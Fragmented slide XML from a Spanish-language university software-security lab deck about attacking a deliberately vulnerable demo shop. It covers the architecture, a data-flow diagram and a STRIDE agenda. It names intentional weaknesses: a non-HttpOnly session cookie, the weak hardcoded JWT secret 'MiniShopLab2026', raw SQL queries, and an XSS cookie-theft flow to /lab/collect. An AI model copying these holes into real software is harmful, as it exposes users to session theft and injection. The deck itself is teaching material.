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D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D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F8203FD-4624-4AC4-8BF4-A7F213E7602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s-D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D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D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36A4566-1366-46D1-8F14-26EFF703460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s-D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D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D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25D4EAD-5CEF-49C6-A765-6BCC52D09A2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s-D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D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D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40A5976-22F0-4F31-ABA5-6EB8FC73800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s-D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k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o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y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D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D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9911382-194C-44F4-8FE4-421EF43458C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s-D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D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D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3456314-4779-4E94-A859-95089CE7C9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s-D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D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D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77E852A-7EE7-41D8-892C-1837625775C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s-D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D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D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CFA9A07-7353-4789-BBD3-0B5B521F625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s-D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D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D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B5ADC31-7313-4456-8D4A-0E36AEBE2A3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s-D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D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D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2D33A72-B371-4002-A21D-43472DA505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s-D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s-DO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s-DO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D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D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5B64E26-FF30-4B86-A5F2-9269CFD8F30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s-D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33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400" cy="456840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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457200" y="7308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UNIVERSIDAD APEC · SEGURIDAD DE SOFTWARE ISW · LABORATORIO DEMO</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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914400" y="1645920"/>
            <a:ext cx="10058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5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🛡️  UNAPEC Mini Shop</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO" sz="5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914400" y="301752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600" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Security Lab</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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914400" y="384048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Modelo de Amenazas · Análisis de Seguridad · Fase 1 (Red Team)</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="4846320"/>
            <a:ext cx="6705000" cy="18000"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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Box 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="914400" y="5120640"/>
            <a:ext cx="10058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Jean de los Santos   ·   Jose Canelo   ·   Rainiery Peña</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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400" b="0" u="none" strike="noStrike">
                <a:solidFill>
                  <a:srgbClr val="D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Proyecto Integrador Avanzado · Octubre 2026</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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ectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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Box 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Agenda</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1463040"/>
            <a:ext cx="639720" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst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6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1554480"/>
            <a:ext cx="63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01</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="148140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Arquitectura de la Aplicación</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="1755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Stack tecnológico, roles y despliegue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Rounded Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2176200"/>
            <a:ext cx="639720" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst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10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2267640"/>
            <a:ext cx="63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02</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="219456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Diagrama de Flujo de Datos (DFD)</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="24688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Entidades, flujos y límites de confianza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Rounded Rectangle 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2889360"/>
            <a:ext cx="639720" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst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14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="2980800"/>
            <a:ext cx="63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03</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="290772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Modelo de Amenazas STRIDE</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="318204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10 amenazas identificadas y clasificadas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ounded Rectangle 17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3602880"/>
            <a:ext cx="639720" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst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18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3694320"/>
            <a:ext cx="63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04</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="362088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Demostración de Vulnerabilidades</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="38952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5 ataques ejecutados con evidencia detallada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21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4316040"/>
            <a:ext cx="639720" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst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Box 22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4407480"/>
            <a:ext cx="63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05</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="433440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Evidencia DevTools / Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="4608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Peticiones HTTP, headers, respuestas capturadas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ounded Rectangle 25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5029200"/>
            <a:ext cx="639720" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst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26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5120640"/>
            <a:ext cx="63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06</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="504756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Puntuaciones CVSS v3.1</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="53218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Evaluación de severidad por hallazgo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Rounded Rectangle 29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5742360"/>
            <a:ext cx="639720" cy="548280"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst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TextBox 30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5833800"/>
            <a:ext cx="639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07</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="576072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Conclusiones y Recomendaciones</a:t>
            </a:r>
            <a:endParaRPr lang="es-DO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32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1280160" y="603504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Remediaciones para Fase 2 (Blue Team)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1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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" name="Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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Box 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Arquitectura de la Aplicación</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Stack tecnológico y configuración del laboratorio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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1371600"/>
            <a:ext cx="5486040" cy="5028840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Box 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="155448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⚙️  Servidor Web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8"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="187452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ASP.NET Core 10 (Kestrel) — MVC/Razor + API Controllers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9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="233172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🗄️  Base de Datos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10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="265176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PostgreSQL 18 Alpine — 7 tablas, datos sintéticos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11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="310896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🐳  Contenedor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12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="342900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Docker Compose — bind 127.0.0.1:5081, read-only, non-root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13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="388620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🔐  Auth MVC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14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="420624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Cookie LabSession — HttpOnly=false en Red Team (intencionalmente)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15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="466344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🎫  Auth API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16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="498348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JWT Bearer HS256 — secreto </a:t>
            </a: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débil 'MiniShopLab2026' (15 </a:t>
            </a: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bytes)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7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="5440680"/>
            <a:ext cx="5028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👥  Roles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18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="731520" y="576072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Cliente (4 cuentas) · Vendedor </a:t>
            </a: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(1) · Admin (1)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Picture 19" descr="01-home-new.png"/>
          <p:cNvPicPr/>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId1"/>
          <a:stretch/>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="1371600"/>
            <a:ext cx="5303160" cy="29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" name="TextBox 20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="6400800" y="4572000"/>
            <a:ext cx="5303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Catálogo de productos — Vista pública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angle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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TextBox 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1836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UNIVERSIDAD APEC — SEGURIDAD DE SOFTWARE ISW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4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="36576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Diagrama de Flujo de Datos (DFD)</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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5"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="77724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D4A843"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>Fase 1 — Entidades, flujos de datos y límites de confianza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Rounded Rectangle 6"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1828800"/>
            <a:ext cx="2011320" cy="914040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2C7BE5"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0033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Box 7"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="1874520"/>
            <a:ext cx="2011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🌐</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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457200" y="2194560"/>
            <a:ext cx="2011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Usuario</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1000"/>
            </a:b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(Cliente/Vendedor/Admin)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ounded Rectangle 9"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="1828800"/>
            <a:ext cx="2559960" cy="914040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="003366"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0033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10"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="1874520"/>
            <a:ext cx="2559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⚙️</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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11"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4754880" y="2194560"/>
            <a:ext cx="2559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ASP.NET Core</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1000"/>
            </a:b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MVC/Razor + API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Rounded Rectangle 12"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="1828800"/>
            <a:ext cx="2285640" cy="914040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="2D6A4F"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0033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TextBox 13"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="187452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🗄️</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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14"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="2194560"/>
            <a:ext cx="2285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PostgreSQL</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1000"/>
            </a:b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(Datos sintéticos)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Rounded Rectangle 15"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3840480"/>
            <a:ext cx="2011320" cy="914040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="8E44AD"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0033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Box 16"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="3886200"/>
            <a:ext cx="2011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🔍</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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17"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="4206240"/>
            <a:ext cx="2011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Burp / ZAP</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1000"/>
            </a:b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Herramientas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Rounded Rectangle 18"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="3840480"/>
            <a:ext cx="2285640" cy="914040"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="6C757D"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="0033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19"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="388620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📋</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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20"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9144000" y="4206240"/>
            <a:ext cx="2285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Logs</a:t>
            </a:r>
            <a:br>
              <a:rPr sz="1000"/>
            </a:b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(stdout contenedor)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21"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="164592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→ HTTP, cookies, JWT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22"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="283464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27AE60"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>← HTML/JSON, cookie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23"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7589520" y="1645920"/>
            <a:ext cx="137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→ EF Core/Npgsql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24"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7589520" y="283464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→ SQL raw (Red Team)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25"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7589520" y="4114800"/>
            <a:ext cx="137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→ Logs app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26"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="411480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8E44AD"/>
                </a:solidFill>
                <a:effectLst/>
                <a:uFillTx/>
                <a:latin typeface="Calibri"/>
              </a:rPr>
              <a:t>→ HTTP loopback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27"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="274320" y="5029200"/>
            <a:ext cx="11429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─ ─ ─  Trust Boundaries  ─ ─ ─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Rounded Rectangle 28"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5394960"/>
            <a:ext cx="2102760" cy="639720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDF5E6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="D4A84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29"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5440680"/>
            <a:ext cx="2102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TB-1: Navegador → App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30"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="5669280"/>
            <a:ext cx="2102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Entrada no confiable</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Rounded Rectangle 31"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="5394960"/>
            <a:ext cx="2102760" cy="639720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDF5E6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="D4A84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1" name="TextBox 32"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="5440680"/>
            <a:ext cx="2102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TB-2: Herramientas → App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33"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="2743200" y="5669280"/>
            <a:ext cx="2102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Solo loopback</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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ounded Rectangle 34"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="5394960"/>
            <a:ext cx="2102760" cy="639720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDF5E6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="D4A84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Box 35"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="5440680"/>
            <a:ext cx="2102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TB-3: App → PostgreSQL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36"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="5029200" y="5669280"/>
            <a:ext cx="2102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Límite proceso/datos</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Rounded Rectangle 37"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5394960"/>
            <a:ext cx="2102760" cy="639720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDF5E6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="D4A84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" name="TextBox 38"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5440680"/>
            <a:ext cx="2102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TB-4: /lab/collect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39"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="7315200" y="5669280"/>
            <a:ext cx="2102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Flujo XSS cookie</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Rounded Rectangle 40"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9601200" y="5394960"/>
            <a:ext cx="2102760" cy="639720"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 16667"/>
            </a:avLst>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="FDF5E6"/>
          </a:solidFill>
          <a:ln w="12700">
            <a:solidFill>
              <a:srgbClr val="D4A84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Box 41"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9601200" y="5440680"/>
            <a:ext cx="2102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TB-5: Contenedor → Host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42"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="9601200" y="5669280"/>
            <a:ext cx="21027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Solo 127.0.0.1</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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43"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="457200" y="31089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↗ Cookie robada → /lab/collect</a:t>
            </a:r>
            <a:endParaRPr lang="es-D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Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="0"/>
            <a:ext cx="12191400" cy="319680"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:srgbClr val="D4A84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Rectangle 2"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="320040"/>
            <a:ext cx="12191400" cy="77688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Box 3"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
